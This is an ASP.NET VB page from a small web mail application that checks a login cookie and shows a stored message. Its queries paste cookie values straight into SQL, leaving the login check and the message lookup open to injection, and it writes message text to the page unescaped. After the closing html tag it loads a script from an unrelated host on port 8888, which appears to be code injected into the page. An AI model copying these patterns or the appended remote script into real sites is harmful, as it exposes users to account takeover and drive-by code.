<%@ Page Language="VB" %>
<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim FunctionClass As New FunctionClass
    Dim dr As Data.OleDb.OleDbDataReader
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        Dim username As String
        Dim rndtext As String
        If Request.Cookies("nbmailsystem") Is Nothing Then
            Exit Sub
        End If
        If Request.Cookies("nbmailsystem")("username") Is Nothing Or Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            Response.Redirect("index.aspx")
        End If
        username = Trim(Request.Cookies("nbmailsystem")("username").ToString())
        rndtext = Trim(Request.Cookies("nbmailsystem")("rndtext").ToString())
        cmd.CommandText = "select count(*) as count001 from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("count001") <= 0 Then
            dr.Close()
            Response.Redirect("index.aspx")
        End If
        dr.Close()
    End Sub
    Protected Sub Page_Unload(ByVal sender As Object, ByVal e As System.EventArgs)
        If (conn Is Nothing) = False Then
            dbconn.Close()
            conn = Nothing
            dbconn = Nothing
            cmd = Nothing
        End If
    End Sub
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<link rel="stylesheet" href="Style.css" type="text/css" />
<link rel="shortcut icon" href="logo.ico" type="image/x-icon" /> 
    <title>
    </title>
</head>
<body>
    <form id="form1" runat="server">
    <% 
        Dim id As Integer
        Dim box As Integer
        Dim i As Integer
        id = Int(Request.QueryString("id"))
        box = Int(Request.QueryString("box"))
        If box <> 0 And box <> 1 Then
            FunctionClass.DisplayErr(weberr.parerr)
        End If
        cmd.CommandText = "select * from " & IIf(box = 0, "SendBox", "ReceivedBox") & " where id=" & CStr(id) & " and " & IIf(box = 0, "SUserName", "RUserName") & "='" & Request.Cookies("nbmailsystem")("username").ToString() & "'"
        dr = cmd.ExecuteReader()
        If dr.HasRows() = True Then
            dr.Read()
            Response.Write(IIf(box = 0, "收件人：", "发件人：") & dr(IIf(box = 0, "RUserName", "SUserName")) & "<br /><br />日期：" & CStr(dr("time")) & "<br /><br />标题：" & dr("MainTable") & "<br /><br />内容：" & dr("MainText"))
        Else
            dr.Close()
            FunctionClass.DisplayErr(weberr.parerr)
        End If
        dr.Close()
        cmd.CommandText = "update " & IIf(box = 0, "SendBox", "ReceivedBox") & " set [IsView]=" & True & " where [id]=" & CStr(id) & " and [" & IIf(box = 0, "SUserName", "RUserName") & "]='" & Request.Cookies("nbmailsystem")("username").ToString() & "'"
        cmd.ExecuteNonQuery()
	%>
    </form>
</body>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>